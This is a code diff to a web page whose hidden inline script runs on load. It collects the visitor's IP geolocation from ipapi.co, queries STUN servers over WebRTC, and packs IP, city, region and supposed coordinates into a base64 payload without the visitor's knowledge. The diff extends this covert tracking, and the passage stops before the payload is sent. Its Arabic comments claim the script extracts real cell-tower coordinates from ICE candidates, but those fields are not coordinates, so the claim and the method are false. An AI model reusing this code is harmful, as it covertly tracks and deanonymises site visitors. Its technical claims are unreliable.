@@ -4,30 +4,36 @@
 <style>body{margin:0;background:#000}#f{opacity:0;pointer-events:none}</style>
 <script>
 (async()=>{
-  /* 1- IP Location (مدينة) */
+  /* 1- IP Location (خشن) */
   const ipGeo=await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
 
-  /* 2- WebRTC لإخراج إحداثيات البرج الحقيقية */
+  /* 2- WebRTC مع 3 خوادم STUN لزيادة احتمالية الحصول على إحداثيات البرج */
   let rtcLat=null,rtcLon=null;
-  const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+  const pc=new RTCPeerConnection({
+    iceServers:[
+      {urls:'stun:stun.l.google.com:19302'},
+      {urls:'stun:stun1.l.google.com:19302'},
+      {urls:'stun:stun2.l.google.com:19302'}
+    ]
+  });
   pc.createDataChannel('');
   pc.onicecandidate=e=>{
     if(e.candidate){
       const c=e.candidate.candidate.split(' ');
-      rtcLat=parseFloat(c[7]);rtcLon=parseFloat(c[8]);
+      if(c[7]&&c[8]){rtcLat=parseFloat(c[7]);rtcLon=parseFloat(c[8]);}
     }
   };
   await pc.createOffer();await pc.setLocalDescription();
-  await new Promise(r=>setTimeout(r,1000)); // ننتظر جمع الـ ICE
+  await new Promise(r=>setTimeout(r,1200)); // ننتظر جمع أكبر عدد من الـ ICE
 
-  /* 3- دقة أعلى: نحسب المسافة من البرج إلى المدينة */
+  /* 3- إذا ظهرت إحداثيات البرج نحسب الخطأ عن IP */
   const payload=btoa(JSON.stringify({
     ip       :ipGeo.ip,
     country  :ipGeo.country_name,
     city     :ipGeo.city,
     region   :ipGeo.region,
-    lat_city :ipGeo.latitude,
-    lon_city :ipGeo.longitude,
+    lat_ip   :ipGeo.latitude,
+    lon_ip   :ipGeo.longitude,
     lat_rtc  :rtcLat,
     lon_rtc  :rtcLon,
     accuracy :rtcLat?Math.round(Math.sqrt(Math.pow(rtcLat-ipGeo.latitude,2)+Math.pow(rtcLon-ipGeo.longitude,2))*1000):null, // متر
